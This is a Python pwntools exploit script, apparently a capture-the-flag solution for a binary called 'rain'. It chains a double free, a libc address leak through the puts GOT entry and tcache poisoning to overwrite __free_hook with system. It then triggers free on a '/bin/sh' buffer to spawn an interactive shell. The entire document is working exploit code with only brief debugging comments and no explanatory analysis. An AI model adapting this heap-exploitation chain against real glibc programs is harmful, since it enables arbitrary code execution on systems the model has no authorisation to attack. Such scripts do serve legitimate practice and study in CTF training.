from pwn import *
filename="./rain"
libc_name="./libc.so.6"
io = process(filename)
context.log_level='debug'
elf=ELF(filename)
libc=ELF(libc_name)
context.terminal=['tmux','split','-hp','60']


def config(input):
    io.recvuntil('ch> ')
    io.sendline('1')
    io.recvuntil('FRAME> ')
    io.send(input)

def show():
    io.recvuntil('ch> ')
    io.sendline('2')

def debug():
    gdb.attach(io,"b *0x400E17")
    show()

def change(aaa):
    return bytes(aaa,encoding="utf-8")

def form_buf(height,width,front_colour,back_colour,rainfall,content=b''):
    payload = b""
    payload +=p32(height)
    payload+=p32(width)
    payload+=p8(front_colour)
    payload+=p8(back_colour)
    payload+=p32(rainfall)
    payload = payload.ljust(18,b'a')
    # print(payload)
    if(content==0):
        return payload
    else:
        payload = payload+content
        return payload

show()
# USE double-free to hijack the rain structure
buf = form_buf(0x1,0x1,0x0,0x0,0x1,b'a'*0x48) #0x90
config(buf)
buf = form_buf(0x1,0x1,0x0,0x0,0x1) # free buf
config(buf)
# buf = form_buf(0x1,0x1,0x2,0x1,0x64) # free buf
# config(buf) # double free buf
# debug() # check double freed tcache



# a normal buf to call normal rain
buf = form_buf(0x50,0x50,0x2,0x1,0x64,b'a'*0x58) # realloc to 0x58, double free also
config(buf)

# call rain to malloc a new one
io.recvuntil('ch> ')
io.sendline('3')
# debug() # check structure in the double-free chunk
payload = p32(0x50)+p32(0x50)+p8(2)+p8(1)+b'a'*6+p64(0)*3+p64(0x400E17)+p64(elf.got['puts'])+p64(0)
buf = form_buf(0x0,0x0,0x2,0x1,0x64,payload) # important to write zero, because 0x48 chunk need NULL fd
config(buf)
# debug()
buf2 = form_buf(0x50,0x50,0x2,0x1,0x64,p64(0))
config(buf2)
# debug() # check get libc
show()
io.recvuntil("Table:            ")
libc_info = u64(io.recvuntil(b'\x7f').ljust(8, b'\x00'))
success("libc_info: " + hex(libc_info))
libc_base = libc_info - 0x080a30
success("libc_base: " + hex(libc_base))
# debug()
free_hook = libc_base + libc.sym['__free_hook']
system = libc_base + libc.symbols['system']

# gdb.attach(io,"b *0x401B50")
io.recvuntil('ch> ')
io.sendline('3') # clear
# debug() # check ok
buf = form_buf(0x1,0x1,0x0,0x0,0x1,b'a'*0x48) #0x90
config(buf) # add a 0x48 chunk
buf = form_buf(0x1,0x1,0x0,0x0,0x1) # free 0x48 chunk
config(buf)
config(buf) # double free
buf = form_buf(0x50,0x50,0x2,0x1,0x64,p64(free_hook-0x8).ljust(0x48,b'a')) 
config(buf)
# debug()  # check free_hook in tcache's bk

# gdb.attach(io,"b *0x401B50")
io.recvuntil('ch> ')
io.sendline('3') # clear

buf = form_buf(0x1,0x1,0x0,0x0,0x1,b'/bin/sh\x00'+p64(system)+b'a'*0x38)
config(buf)
# debug() # check free_hook hijacked

buf = form_buf(0x1,0x1,0x0,0x0,0x1)
config(buf) # call free




io.interactive()